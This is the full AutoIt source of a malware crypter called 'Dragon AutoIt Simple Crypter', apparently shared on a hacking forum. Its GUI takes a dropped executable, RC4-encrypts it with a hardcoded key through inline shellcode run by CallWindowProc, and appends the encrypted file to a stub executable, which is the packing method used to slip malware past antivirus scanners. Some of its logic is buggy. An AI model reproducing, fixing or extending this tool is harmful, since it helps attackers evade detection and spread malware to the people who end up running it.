#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <WinAPI.au3>

;==============================================;
; Dragon AutoIt Simple Crypter M3			  ;
; Coded By M3								  ;
; For  Http://www.hackcommunity.com/		   ;
;==============================================;


#Region ### START Koda GUI section ### Form=
$Form1 = GUICreate("Dragon Autoit Crypter M3", 365, 168, -1, -2 ,-1,$WS_EX_ACCEPTFILES)
GUISetOnEvent($GUI_EVENT_DROPPED, "sDragAndDrop")
GUISetCursor (3)
GUISetFont(8, 400, 0, "Cambria")
GUISetBkColor(0x000000)
WinSetOnTop($Form1, "", 1)
$Text1 = GUICtrlCreateInput("Drag And Drop ....", 8, 118, 350, 16)
GUICtrlSetState(-1, $GUI_DROPACCEPTED)
GUISetState(@SW_SHOW)
GUICtrlSetCursor (-1, 3)
$Text2 = GUICtrlCreateInput("<<<<<  Pass  >>>>>", 8, 147, 100, 16)
GUICtrlSetCursor (-1, 3)
$Crypt = GUICtrlCreateButton("Encryptar", 115, 145, 120, 20)
GUICtrlSetCursor (-1, 3)
$AboutSoftware = GUICtrlCreateButton("Acerca De", 240, 145, 120, 20)
GUICtrlSetCursor (-1, 3)
$sProgressBar = GUICtrlCreateProgress(8, 137, 350, 6)
$sImage = GUICtrlCreatePic("AutoItCliente.jpg", 0, 0, 393, 113)
#EndRegion ### END Koda GUI section ###




	;Simple Form Efect

$Long = 1
Do

  _WinAPI_SetWindowRgn($Form1, _WinAPI_CreateRoundRectRgn(0, 0, 560 , $Long , 0 ,  0))
  Sleep(1)
  $Long = $Long + 1

Until $Long = 200





	While 1


	 $nMsg = GUIGetMsg()
	 Switch $nMsg



	 Case $GUI_EVENT_CLOSE
	 Exit




	 Case $AboutSoftware

	 Msgbox (64,"AutoIt Crypter M3" ,"Coded By  M3 , Thanks to TranceXX")




	 Case $Crypt


	 If GuiCtrlRead($Text1) = "Drag and Drop your file ...." then
	 Msgbox(0,"Atention ","First Drag and Drop your File")
	 Exit
		 Endif




 FileWrite (@ScriptDir & "\Stub.exe", GuiCtrlRead($Text2))

		 $sKey = "\\BYM3\\"

 $stub = FileOpen(@ScriptDir & "\Stub.exe")

 $sStub = FileRead($stub)

 $sArquive = FileRead(FileOpen(GuiCtrlRead($Text1)))

 $sArquive = _RC4($sArquive,$sKey)

		 $salvar = FileOpen(FileSaveDialog("Save File", @ScriptDir, "PE Files(*.exe)") & ".exe", 18)

		 FileWrite($salvar, $sStub)

 FileWrite($salvar, StringToBinary($sKey))

 FileWrite($salvar, $sArquive)

 FileClose($stub)

 FileClose($Text1)

 Fileclose($Salvar)


		 GUICtrlSetData ($sProgressBar,GUICtrlRead($sProgressBar) + 100)



	EndSwitch

	WEnd






Func sDragAndDrop()

ConsoleWrite("ID: " & @GUI_DRAGID & " File: " & @GUI_DRAGFILE & " Drop: " & @GUI_DROPID & @CRLF)

EndFunc





	Func _RC4($Data, $key)


	  Local $OPCODE = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
   Local $CodeBuffer = DllStructCreate("byte[" & BinaryLen($OPCODE) & "]")
   DllStructSetData($CodeBuffer, 1, $OPCODE)
   Local $Buffer = DllStructCreate("byte[" & BinaryLen($Data) & "]")
   DllStructSetData($Buffer, 1, $Data)
   DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($CodeBuffer), "ptr", DllStructGetPtr($Buffer), "int", BinaryLen($Data), "str", $key, "int", 0)
   Local $Ret = DllStructGetData($Buffer, 1)
   $Buffer = 0
   $CodeBuffer = 0
   Return $Ret


	EndFunc